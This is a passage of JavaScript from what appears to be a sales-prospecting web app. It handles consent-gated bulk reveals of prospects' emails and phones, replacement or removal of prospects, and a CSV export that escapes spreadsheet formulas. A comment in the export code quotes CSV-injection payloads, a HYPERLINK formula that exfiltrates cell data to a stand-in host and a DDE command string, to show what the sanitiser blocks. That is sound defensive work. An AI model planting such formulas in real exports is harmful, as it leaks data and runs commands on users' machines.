    cost.textContent = 'Looks up a verified email and phone for each of these ' +
      people.length + '. Nothing is looked up until you confirm.';
    go.disabled = false;
    CONFIRM.ready = true;
    return;
  }

  go.disabled = true;
  cost.textContent = 'Checking how many and what it costs…';
  var consent = await guard('err-confirm', function(){
    return callEnrichment(enrichArgs([],
      'Rep opened a bulk reveal above the consent threshold from their weekly plan',
      { total_count: people.length }));
  });
  if (!CONFIRM || CONFIRM.ai !== ai) return;          // rep closed it meanwhile
  if (consent === null) { cost.textContent = ''; return; }

  /* Verbatim, via textContent. Paraphrasing the cost defeats the flow. */
  var message = consent.user_facing_message || consent.message;
  if (!message || !consent.confirmation_token) {
    showError('err-confirm',
      'We could not confirm the cost for that many people. Reveal them individually, or ask in chat.',
      false);
    cost.textContent = '';
    console.log('unexpected consent response', { responseFields: fieldNames(consent) });
    return;
  }
  cost.textContent = message;
  CONFIRM.token = consent.confirmation_token;
  CONFIRM.batch = consent.max_batch_size || DEFAULT_BATCH;
  CONFIRM.ready = true;
  go.disabled = false;
}

function chunk(list, size){
  var out = [];
  for (var i = 0; i < list.length; i += size) out.push(list.slice(i, i + size));
  return out;
}

/* Rows map to people by normalised LinkedIn URL and nothing else. A
   positional fallback would be a guess, and the cost of guessing wrong is a
   rep emailing the wrong human — strictly worse than revealing nobody. */
function indexRows(payload){
  var byUrl = {};
  rowsOf(payload).forEach(function(row){
    var key = normalizeLi(pickField(row, ['linkedin_url','linkedin','profile_url','url','li']));
    if (key) byUrl[key] = row;
  });
  return byUrl;
}

async function confirmRevealAll(){
  if (!CONFIRM || !CONFIRM.ready) return;
  var state = CONFIRM;
  var account = BOARD[state.ai];
  var people = state.people;
  var go = document.getElementById('c-go');
  go.disabled = true;
  go.innerHTML = '<span class="spin"></span>Revealing…';

  var batches = chunk(people, state.batch);
  var payloads = await guard('err-confirm', async function(){
    var out = [];
    for (var i = 0; i < batches.length; i++) {
      var extra = state.token
        ? { total_count: state.total, confirmation_token: state.token }
        : {};
      var label = batches.length > 1 ? ' (' + (i + 1) + ' of ' + batches.length + ')' : '';
      go.innerHTML = '<span class="spin"></span>Revealing…' + label;
      out.push(await callEnrichment(enrichArgs(
        batches[i].map(function(p){ return contactPayload(account, p); }),
        'Rep approved a bulk contact reveal from their weekly plan', extra), function(){
        go.innerHTML = '<span class="spin"></span>Still working…' + label;
      }));
    }
    return out;
  });

  if (payloads === null) {
    go.disabled = false;
    go.textContent = 'Yes, reveal ' + people.length;
    return;
  }

  var byUrl = {};
  payloads.forEach(function(payload){
    var part = indexRows(payload);
    for (var key in part) if (part.hasOwnProperty(key)) byUrl[key] = part[key];
  });

  /* "No rows at all" and "rows we could not match" are different answers. The
     tool echoes every contact back with null values when it finds nothing, so
     an all-miss arrives fully matched and falls through to the loop below as
     the miss it is. Reaching here with rows present means the shape changed,
     which is worth refusing rather than guessing at. */
  var allRows = payloads.reduce(function(acc, p){ return acc.concat(rowsOf(p)); }, []);
  var rowCount = allRows.length;
  if (rowCount && !Object.keys(byUrl).length) {
    /* The shape is the whole diagnosis here, and the shape is the key names --
       the values in these rows are the emails and phones we just paid for. */
    console.log('bulk reveal returned rows that could not be matched by profile URL',
      { rowCount: rowCount, rowFields: fieldNames(allRows[0]) });
    showError('err-confirm',
      'That came back in a shape we could not match to these people. Nothing was changed — ' +
      'reveal them individually, or ask in chat.', false);
    go.disabled = false;
    go.textContent = 'Yes, reveal ' + people.length;
    return;
  }

  /* A truncated response is a short answer, not a negative one. Marking the
     people it left out as "checked, none found" would bill them a second time
     to learn what we never actually asked. */
  var short = payloads.some(function(p){ return p && p.truncated; });
  var found = 0, skipped = 0;
  for (var i = 0; i < people.length; i++) {
    var person = people[i];
    var row = byUrl[normalizeLi(person.li)];
    if (!row && short) { skipped++; continue; }
    var hit = applyContactRow(person, row || {});
    if (hit) found++;
    await bufferOrWarn(hit ? 'revealed' : 'reveal_miss',
      { account: account.id, person: person.li }, 'err-acct-' + account.id);
  }

  closeConfirm();
  var missed = people.length - found - skipped;
  toast(found
    ? 'Revealed ' + found + ' of ' + people.length + ' at ' + account.name +
      (missed ? '. ' + missed + ' came up empty — open them to try again.' : '.') +
      (skipped ? ' ' + skipped + ' were not returned — run it again for those.' : '')
    : 'No verified contact data found for these ' + people.length + '. You can try again.');
  render();
}

async function runMatch(){

  out.innerHTML = '<div class="match-card"><span class="spin"></span>Checking &ldquo;' +
    escHtml(value) + '&rdquo;…</div>';

  var result = await guard('err-swap', async function(){
    var args = value.indexOf('.') !== -1 ? { companies: [{ website: value }] }
                                        : { companies: [{ name: value }] };
    args.telemetry = { intent: 'Rep checked a replacement account from their weekly plan' };
    return await callTool('match_company', args);
  });

  if (result === null) { out.innerHTML = ''; return; }

  var match = firstRow(result);
  if (!match || match.matched === false || (!match.name && !match.linkedin_url)) {
    out.innerHTML = '<div class="match-card">No confident match for &ldquo;' + escHtml(value) +
      '&rdquo;. Try the full company domain.</div>';
    return;
  }
  out.innerHTML = '<div class="match-card"><b>' + escHtml(match.name || value) + '</b><br>' +
    '<span class="note">' +
    (match.website ? 'Website: ' + escHtml(match.website) + '<br>' : '') +
    (match.linkedin_url ? 'Profile: ' + escHtml(match.linkedin_url) : '') +
    '</span><br><br>Ask in chat to build the full plan for this account — signals, ' +
    'people and drafts take a couple of minutes.</div>';
}

async function replaceProspect(ai, pi){
  var account = BOARD[ai];
  var person = account.personas[pi];
  var slot = 'err-p-' + ai + '-' + pi;

  var result = await guard(slot, async function(){
    return await callTool('ai_prospecting', {
      action: 'run',
      company_linkedin_url: account.li ? 'https://' + account.li : '',
      telemetry: { intent: 'Rep marked a contact not relevant and asked for the next best buyer at the same account' }
    });
  });
  if (result === null) return;

  var seen = {};
  account.personas.forEach(function(p){ if (p.li) seen[p.li] = true; });
  var candidates = rowsOf(result).filter(function(row){
    var li = String(row.LINKEDIN_URL || row.linkedin_url || '').replace(/^https?:\/\//, '');
    return li && !seen[li];
  });

  if (!candidates.length) {
    showError(slot, 'No clean replacement came back. Ask in chat for a hand-picked one.', false);
    return;
  }

  var pick = candidates[0];
  account.personas[pi] = normalizePersona({
    name: pick.FULL_NAME || pick.full_name || 'New contact',
    title: pick.TITLE_NAME || pick.job_title || '',
    loc: pick.location || '',
    p: 'REPLACEMENT',
    li: String(pick.LINKEDIN_URL || pick.linkedin_url || '').replace(/^https?:\/\//, ''),
    signal: { d: 'Replacement', q: pick.ai_reasoning || 'Surfaced as a strong fit at this account.',
              why: 'Ranked a strong fit for ' + account.name + '.' },
    why: 'Replacement surfaced for ' + account.name + '.',
    mail: { s: '', b: '' }
  });

  await bufferOrWarn('replaced',
    { account: account.id, removed: person.li, added: account.personas[pi].li }, slot);
  document.getElementById('p-overlay').classList.remove('open');
  toast('Replaced ' + person.name + ' at ' + account.name);
  render();
}

async function removeProspect(ai, pi){
  var account = BOARD[ai];
  var person = account.personas[pi];
  account.personas.splice(pi, 1);
  var written = await bufferOrWarn('removed_person',
    { account: account.id, person: person.li || person.name }, 'err-acct-' + account.id);
  toast(written
    ? 'Removed ' + person.name + '. They will not come back next week.'
    : 'Removed ' + person.name + ' here, but we could not record it — they may come back.');
  render();
}

/* Quoting makes a cell parse correctly; it does nothing about a cell Excel
   decides is code. Every value here came from a prospect profile, a community
   message or a model draft, so a name of `=HYPERLINK("http://x/?"&A1)` is a
   live formula the moment a rep double-clicks the download -- quoted or not.
   CSV has no type system, so the leading apostrophe is the only lever (the
   xlsx path forces a string type instead -- see pg_plan_builder._write_cell).

   `=` always gets the apostrophe. The other three introducers only get it when
   the value could actually name something -- because `+15551234567` is what
   every revealed phone number looks like, and blanket-prefixing turns the most
   used column in this export into `'+15551234567` on every row. Without a
   letter there is no function to call and no sheet to reference, and without
   = ! : & " there is no way to build one, so `+1 (555) 555-0123` is inert on
   its face while `@SUM(A1)` and `-cmd|' /C calc'!A0` still get neutralised.
   Tab and CR go regardless: they re-split the row on some importers. */
function csvCell(value){
  var s = (value == null ? '' : String(value)).replace(/[\t\r]/g, ' ');
  var namesSomething = /[A-Za-z=!:&"]/.test(s);
  if (/^=/.test(s) || (/^[+\-@]/.test(s) && namesSomething)) s = "'" + s;
  return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}
function downloadCsv(){
  var header = ['Week','Account','Contact','Title','Profile','Email','Phone']
    .concat(TOUCHES.map(function(_, i){ return 'Touchpoint ' + (i + 1); }))
    .concat(['Completed?','Meeting booked?','Notes']);
  var lines = [header];
  BOARD.forEach(function(account){
    account.personas.forEach(function(person){
      lines.push([
        isPlaceholder(WEEK_LABEL) ? '' : WEEK_LABEL,
        account.name, person.name, person.title,
        person.li ? 'https://' + person.li : '',
        person.email || '', person.phone || ''
      ].concat(TOUCHES).concat(['', '',
        person.signal.d + (person.warm ? '  ·  Warm intro: ' + person.warm : '')
      ]));
    });
  });
  var csv = lines.map(function(row){ return row.map(csvCell).join(','); }).join('\n');
  var link = document.createElement('a');
  link.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
  link.download = 'weekly-plan.csv';
  link.click();
  URL.revokeObjectURL(link.href);
  toast('Downloaded. Includes any contact data you revealed.');
}

/* ------------------------------------------------------------------ *
 * Wiring
 * ------------------------------------------------------------------ */
function pair(value){ return value.split(',').map(Number); }

document.addEventListener('click', function(event){
  var target = event.target;
  var el = target.closest ? target.closest('[data-open],[data-remove],[data-dims],[data-swap],[data-request],[data-reveal],[data-replace],[data-remove-close],[data-close],[data-filter]') : null;
  if (!el) return;

  if (el.hasAttribute('data-remove')) {
    event.stopPropagation();
    var r = pair(el.getAttribute('data-remove'));
    removeProspect(r[0], r[1]);
  } else if (el.hasAttribute('data-remove-close')) {
    var rc = pair(el.getAttribute('data-remove-close'));
    document.getElementById('p-overlay').classList.remove('open');
    removeProspect(rc[0], rc[1]);
  } else if (el.hasAttribute('data-reveal')) {
    var rv = pair(el.getAttribute('data-reveal'));
    revealContact(rv[0], rv[1]);
  } else if (el.hasAttribute('data-replace')) {
    var rp = pair(el.getAttribute('data-replace'));
    replaceProspect(rp[0], rp[1]);
  } else if (el.hasAttribute('data-dims')) {
    document.getElementById('sd-' + el.getAttribute('data-dims')).classList.toggle('open');
  } else if (el.hasAttribute('data-swap')) {
    swapAccount(Number(el.getAttribute('data-swap')));
  } else if (el.hasAttribute('data-request')) {
    openRevealAll(Number(el.getAttribute('data-request')));
  } else if (el.hasAttribute('data-close')) {
    document.getElementById(el.getAttribute('data-close')).classList.remove('open');
  } else if (el.hasAttribute('data-filter')) {
    activeFilter = el.getAttribute('data-filter');
    document.querySelectorAll('.chip-f').forEach(function(chip){
      chip.classList.toggle('on', chip === el);
    });
    render();
  } else if (el.hasAttribute('data-open')) {
    var o = pair(el.getAttribute('data-open'));
    openProspect(o[0], o[1]);
  }
});

document.addEventListener('keydown', function(event){
  if (event.key !== 'Enter' && event.key !== ' ') return;
  var el = event.target.closest ? event.target.closest('[data-open]') : null;
  if (!el) return;
  event.preventDefault();
  var o = pair(el.getAttribute('data-open'));
  openProspect(o[0], o[1]);
});

document.getElementById('search').addEventListener('input', function(event){
  searchTerm = event.target.value.trim().toLowerCase();
  render();
});
document.getElementById('btn-csv').addEventListener('click', downloadCsv);
document.getElementById('s-run').addEventListener('click', runMatch);
document.getElementById('s-close').addEventListener('click', function(){
  document.getElementById('s-overlay').classList.remove('open');
});
document.getElementById('s-domain').addEventListener('keydown', function(event){
  if (event.key === 'Enter') runMatch();
});
document.getElementById('c-go').addEventListener('click', confirmRevealAll);
document.getElementById('c-cancel').addEventListener('click', closeConfirm);
document.getElementById('c-close').addEventListener('click', closeConfirm);

['p-overlay','s-overlay'].forEach(function(id){
  document.getElementById(id).addEventListener('click', function(event){
    if (event.target === this) this.classList.remove('open');
  });
});
document.getElementById('c-overlay').addEventListener('click', function(event){
  if (event.target === this) closeConfirm();
});

document.getElementById('footer').textContent =
  'Built from market intelligence across every available layer: buying-intent messages from ' +
  'professional communities, open roles and hiring activity, event attendance, community ' +
  'membership, developer-community activity, verified employee technology footprint, adoption ' +
  'and headcount trends, career-history movement, and annual-filing language. Every quote is ' +
  'reproduced verbatim from a public message. Contact data is fetched only when you ask for it, ' +
  'never automatically.';

/* A read on load, never a write. Until the next run drains it, the buffer is
   the only record that a reveal came back empty, so without replaying it a
   person who was checked looks untouched again after a reload.

   Deliberately narrow: contact-data state only. Replaying removals would
   reach into suppression semantics that belong to the drain. */
async function restoreContactState(){
  var entries;
  try { entries = await readBuffer(); }
  catch (err) { console.error('buffer read failed', err); return; }

  var byId = {};
  BOARD.forEach(function(account){ byId[account.id] = account; });
  var changed = false;

  entries.forEach(function(entry){
    if (entry.kind !== 'reveal_miss') return;
    var payload = (entry && entry.payload) || {};
    var account = byId[payload.account];
    if (!account) return;
    account.personas.forEach(function(person){
      if (!person.li || normalizeLi(person.li) !== normalizeLi(payload.person)) return;
      if (person.email || person.phone) return;
      person.checked = true;
      setBadge(person, 'mis', true);
      changed = true;
    });
  });

  if (changed) render();
}

render();
restoreContactState();
</script>
